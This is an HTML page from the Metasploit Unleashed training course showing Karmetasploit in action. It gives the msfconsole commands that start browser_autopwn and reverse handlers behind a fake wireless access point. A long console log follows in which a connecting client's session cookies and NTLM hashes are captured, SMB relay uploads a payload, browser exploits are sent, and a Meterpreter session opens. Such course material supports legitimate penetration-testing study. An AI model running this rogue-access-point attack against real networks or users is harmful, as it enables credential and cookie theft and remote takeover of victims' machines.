<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Karmetasploit In Action</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Karmetasploit
In Action</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Now, with everything ready, all that is
left is to run Karmetasploit! We start up Metasploit, feeding it our
run control file.
<br>
<br>
</p>
<pre id="code">root@bt4:~# cd /pentest/exploits/framework3/<br>root@bt4:/pentest/exploits/framework3# ./msfconsole -r karma.rc<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; o&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;_&nbsp; _&nbsp; _&nbsp;&nbsp;&nbsp; _ _|_&nbsp; __,&nbsp;&nbsp; ,&nbsp;&nbsp;&nbsp; _&nbsp; | |&nbsp; __&nbsp;&nbsp;&nbsp; _|_<br>/ |/ |/ |&nbsp; |/&nbsp; |&nbsp; /&nbsp; |&nbsp; / _|/ _|/&nbsp; /&nbsp; _|&nbsp; |&nbsp; <br>&nbsp; |&nbsp; |&nbsp; |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 372 exploits - 234 payloads<br>+ -- --=[ 20 encoders - 7 nops<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =[ 149 aux<br><br>resource&gt; load db_sqlite3<br>[-]<br>[-] The functionality previously provided by this plugin has been<br>[-] integrated into the core command set.&nbsp; Use the new 'db_driver'<br>[-] command to use a database driver other than sqlite3 (which<br>[-] is now the default).&nbsp; All of the old commands are the same.<br>[-]<br>[-] Failed to load plugin from /pentest/exploits/framework3/plugins/db_sqlite3: Deprecated plugin<br>resource&gt; db_create /root/karma.db<br>[*] Creating a new database instance...<br>[*] Successfully connected to the database<br>[*] File: /root/karma.db<br>resource&gt; use auxiliary/server/browser_autopwn<br>resource&gt; setg AUTOPWN_HOST 10.0.0.1<br>AUTOPWN_HOST =&gt; 10.0.0.1<br>resource&gt; setg AUTOPWN_PORT 55550<br>AUTOPWN_PORT =&gt; 55550<br>resource&gt; setg AUTOPWN_URI /ads<br>AUTOPWN_URI =&gt; /ads<br>resource&gt; set LHOST 10.0.0.1<br>...snip...<br>[*] Using URL: http://0.0.0.0:55550/hzr8QG95C<br>[*]&nbsp; Local IP: http://192.168.2.2:55550/hzr8QG95C<br>[*] Server started.<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Server started.<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Server started.<br><br>msf auxiliary(http) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">At this point, we are up and
running. All that is required now is for a
client to connect to the fake access point. When they connect, they
will see a fake "captive portal" style screen regardless of what
website they try to connect to. You can look through your output, and
see that a wide number of different servers are started. From DNS,
POP3, IMAP, to various HTTP servers, we have a wide net now cast to
capture various bits of information.
</span>
<p style="color: rgb(0, 0, 0);">Now lets see what happens when a client
connects to the fake AP we have set up.
<br>
<br>
</p>
<pre id="code">msf auxiliary(http) &gt;<br>[*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)<br>[*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.msn.com:80 GET / Windows IE 5.01 cookies=MC1=V=3&amp;GUID=e2eabc69be554e3587acce84901a53d3; MUID=E7E065776DBC40099851B16A38DB8275; mh=MSFT; CULTURE=EN-US; zip=z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId=14; FlightId=BasePage; hpsvr=M:5|F:5|T:5|E:5|D:blu|W:F; hpcli=W.H|L.|S.|R.|U.L|C.|H.; ushpwea=wc:USNE0363; wpv=2<br>[*] DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)<br>[*] DNS 10.0.0.100:1279 XID 88 (IN::A adwords.google.com)<br>[*] DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)<br>[*] DNS 10.0.0.100:1280 XID 89 (IN::A blogger.com)<br>...snip...<br>[*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)<br>[*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)<br>[*] DNS 10.0.0.100:1289 XID 95 (IN::A gmail.com)<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] Request '/ads' from 10.0.0.100:1278<br>[*] Recording detection from User-Agent<br>[*] DNS 10.0.0.100:1292 XID 96 (IN::A gmail.google.com)<br>[*] Browser claims to be MSIE 5.01, running on Windows 2000<br>[*] DNS 10.0.0.100:1293 XID 97 (IN::A google.com)<br>[*] Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3<br>...snip...<br>[*] HTTP REQUEST 10.0.0.100 &gt; ecademy.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; facebook.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; gather.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; gmail.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; gmail.google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8<br>[*] HTTP REQUEST 10.0.0.100 &gt; google.com:80 GET /forms.html Windows IE 5.01 cookies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880:S=snePRUjY-zgcXpEV; NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6hI1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8<br>[*] HTTP REQUEST 10.0.0.100 &gt; linkedin.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; livejournal.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; monster.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; myspace.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; ryze.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Sending MS03-020 Internet Explorer Object Type to 10.0.0.100:1278...<br>[*] HTTP REQUEST 10.0.0.100 &gt; slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Received 10.0.0.100:1360 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0<br>...snip...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.monster.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Received 10.0.0.100:1362 TARGET\P0WN3D LMHASH:47a8cfba21d8473f9cc1674cedeba0fa6dc1c2a4dd904b72 NTHASH:ea389b305cd095d32124597122324fc470ae8d9205bdfc19 OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.myspace.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] AUTHENTICATED as TARGETP0WN3D...<br>[*] Connecting to the ADMIN$ share...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.plaxo.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Regenerating the payload...<br>[*] Uploading payload...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.ryze.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.slashdot.org:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.twitter.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.xing.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; xing.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; yahoo.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Created UxsjordQ.exe...<br>[*] HTTP REQUEST 10.0.0.100 &gt; ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Connecting to the Service Control Manager...<br>[*] HTTP REQUEST 10.0.0.100 &gt; care.com:80 GET / Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.gather.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.ziggs.com:80 GET /forms.html Windows IE 5.01 cookies=<br>[*] Obtaining a service manager handle...<br>[*] Creating a new service...<br>[*] Closing service handle...<br>[*] Opening service...<br>[*] Starting the service...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Removing the service...<br>[*] Closing service handle...<br>[*] Deleting UxsjordQ.exe...<br>[*] Sending Access Denied to 10.0.0.100:1362 TARGET\P0WN3D<br>[*] Received 10.0.0.100:1362 LMHASH:00 NTHASH: OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Sending Access Denied to 10.0.0.100:1362 <br>[*] Received 10.0.0.100:1365 TARGET\P0WN3D LMHASH:3cd170ac4f807291a1b90da20bb8eb228cf50aaf5373897d NTHASH:ddb2b9bed56faf557b1a35d3687fc2c8760a5b45f1d1f4cd OS:Windows 2000 2195 LM:Windows 2000 5.0<br>[*] Authenticating to 10.0.0.100 as TARGET\P0WN3D...<br>[*] AUTHENTICATED as TARGETP0WN3D...<br>[*] Ignoring request from 10.0.0.100, attack already in progress.<br>[*] Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D<br>[*] Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...<br>[*] Sending stage (2650 bytes)<br>[*] Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.care2.com:80 GET / Windows IE 5.01 cookies=<br>[*] Sleeping before handling stage...<br>[*] HTTP REQUEST 10.0.0.100 &gt; www.yahoo.com:80 GET / Windows IE 5.01 cookies=<br>[*] HTTP REQUEST 10.0.0.100 &gt; yahoo.com:80 GET / Windows IE 5.01 cookies=<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] Migrating to lsass.exe...<br>[*] Current server process: rundll32.exe (848)<br>[*] New server process: lsass.exe (232)<br>[*] Meterpreter session 1 opened (10.0.0.1:45017 -&gt; 10.0.0.100:1364)<br><br>msf auxiliary(http) &gt; sessions -l<br><br>Active sessions<br>===============<br><br>&nbsp; Id&nbsp; Description&nbsp; Tunnel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; --&nbsp; -----------&nbsp; ------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp; 1&nbsp;&nbsp; Meterpreter&nbsp; 10.0.0.1:45017 -&gt; 10.0.0.100:1364</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Karmetasploit"
 title="Karmetasploit">Karmetasploit</a></div>
</body>
</html>
